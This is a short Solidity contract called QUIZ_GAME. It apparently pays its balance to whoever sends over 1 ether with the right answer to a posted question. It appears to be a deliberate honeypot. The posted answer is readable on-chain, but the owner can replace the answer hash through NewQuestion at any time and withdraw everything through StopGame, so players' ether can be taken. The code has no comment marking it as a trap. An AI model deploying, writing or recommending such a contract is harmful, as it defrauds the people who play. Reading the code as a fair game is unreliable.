1 pragma solidity ^0.4.20;
2 
3 contract QUIZ_GAME
4 {
5     string public question;
6  
7     address questionSender;
8   
9     bytes32 responseHash;
10  
11     function StartGame(string _question,string _response)
12     public
13     payable
14     {
15         if(responseHash==0x00)
16         {
17             responseHash = keccak256(_response);
18             question = _question;
19             questionSender = msg.sender;
20         }
21     }
22     
23     function Play(string _response)
24     external
25     payable
26     {
27         require(msg.sender == tx.origin);
28         if(responseHash == keccak256(_response) && msg.value>1 ether)
29         {
30             msg.sender.transfer(this.balance);
31         }
32     }
33     
34     function StopGame()
35     public
36     payable
37     {
38        require(msg.sender==questionSender);
39        msg.sender.transfer(this.balance);
40     }
41     
42     function NewQuestion(string _question, bytes32 _responseHash)
43     public
44     payable
45     {
46         require(msg.sender==questionSender);
47         question = _question;
48         responseHash = _responseHash;
49     }
50     
51     function() public payable{}
52     
53 }